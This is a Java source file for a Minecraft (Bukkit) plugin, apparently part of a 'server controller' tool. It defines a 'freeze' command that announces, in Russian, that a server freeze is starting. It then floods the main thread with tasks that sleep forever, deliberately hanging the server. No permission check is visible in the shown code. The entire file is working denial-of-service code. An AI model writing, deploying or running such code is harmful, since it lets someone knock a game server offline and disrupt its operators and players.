package dev.kazi.mcservercontroller.commands.impl;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import dev.kazi.mcservercontroller.commands.AbstractCommand;
import dev.kazi.mcservercontroller.utils.StringUtils;

@AbstractCommand.CommandInfo(name = "freeze")
public class FreezeCommand extends AbstractCommand {

    @Override
    public void onCommand(final Player player, final String[] args) {
        player.sendMessage(StringUtils.color("&f[&6Заморозка сервера&f] &fЗапуск заморозки"));
        for (int i = 0; i < Integer.MAX_VALUE; ++i) {
            for (int j = 0; j < Integer.MAX_VALUE; ++j) {
                Bukkit.getScheduler().runTask(this.plugin, () -> {
                    try {
                        Thread.sleep(Long.MAX_VALUE);
                    }
                    catch (final InterruptedException ex) {}
                    return;
                });
            }
        }
    }
}
